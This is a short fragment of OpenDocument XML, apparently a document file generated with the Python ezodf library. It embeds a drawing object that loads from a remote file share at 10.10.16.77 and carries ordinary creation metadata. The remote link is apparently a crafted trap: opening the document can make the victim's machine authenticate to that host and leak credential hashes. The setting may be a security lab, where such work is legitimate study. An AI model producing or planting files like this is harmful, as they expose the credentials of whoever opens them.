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14.101cm" svg:height="9.999cm" draw:z-index="0"><draw:object xlink:href="file://10.10.16.77/test.jpg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6-21T02:25:30.399679</meta:creation-date>
    <dc:date>2024-06-21T02:25:30.400015</dc:date>
    <meta:generator>http://pypi.python.org/pypi/ezodf/0.1.0$Python3.11.2 (main, May  2 2024, 11:59:08) [GCC 12.2.0]</meta:generator>
    <meta:document-statistic/>
    <meta:editing-cycles>1</meta:editing-cycles>
  </office:meta>
</office:document-meta>
</file>